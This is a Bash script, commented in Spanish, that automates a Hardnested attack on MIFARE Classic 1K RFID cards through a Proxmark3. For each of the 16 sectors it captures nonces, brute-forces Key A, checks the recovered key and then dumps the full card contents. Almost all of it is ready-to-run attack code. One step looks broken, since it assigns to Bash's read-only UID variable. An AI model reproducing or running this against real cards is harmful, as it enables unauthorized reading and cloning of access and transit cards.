#!/usr/bin/env bash
#
# hardnested_auto.sh
# Automatiza ataque Hardnested sobre MIFARE Classic 1K
#

# Ajusta según tu sistema
PORT="-p /dev/ttyACM0"
PM3="./pm3"            # el wrapper instalado
BLOCK_INPUT=0              # bloque de entrada (sector 0)
KEY_INPUT="FFFFFFFFFFFF"   # clave A por defecto en sector 0
#TECH="--1k"
                # Classic 1K

# 1) Lee UID
echo "[*] Leyendo UID..."
UID=$($PM3 $PORT -c "hf 14a read" | awk '/UID:/ {print $2}')
if [ -z "$UID" ]; then
  echo "[!] No se detectó UID. Asegúrate de tener la tarjeta en la antena."
  exit 1
fi
echo "[*] UID detectado: $UID"

# 2) Para cada sector de 0 a 15, fuerza hardnested
for SECTOR in $(seq 0 15); do
  TRAILER=$(( SECTOR*4 + 3 ))
  echo
  echo "=== Sector $SECTOR (trailer block $TRAILER) ==="

  # a) captura nonces
  echo "[*] Capturando nonces..."
  $PM3 $PORT -c "hf mf hardnested $TECH --blk $BLOCK_INPUT -a -k $KEY_INPUT --tblk $TRAILER --ta -w" \
    || { echo "[!] Falló captura nonces en sector $SECTOR"; continue; }

  # b) brute‑force
  echo "[*] Ejecutando brute‑force..."
  OUT=$($PM3 $PORT -c "hf mf hardnested $TECH -r")
  echo "$OUT"

  # extrae clave A hallada
  KEYA=$(echo "$OUT" | awk '/Found target key A:/ {print $5; exit}')
  if [ -z "$KEYA" ]; then
    echo "[!] No se recuperó Key A para sector $SECTOR"
    continue
  fi
  echo "[+] Sector $SECTOR → Key A = $KEYA"

  # c) autentica trailer para validar
  echo "[*] Autenticando sector $SECTOR..."
  $PM3 $PORT -c "hf mf auth $TRAILER A $KEYA" \
    && echo "[+] Autenticación OK" \
    || echo "[!] Autenticación fallida"
done

# 3) Dump completo
echo
echo "[*] Volcando toda la tarjeta..."
$PM3 $PORT -c "hf mf dump"

echo "[*] ¡Listo! Revisa dump-$UID.mfd"  
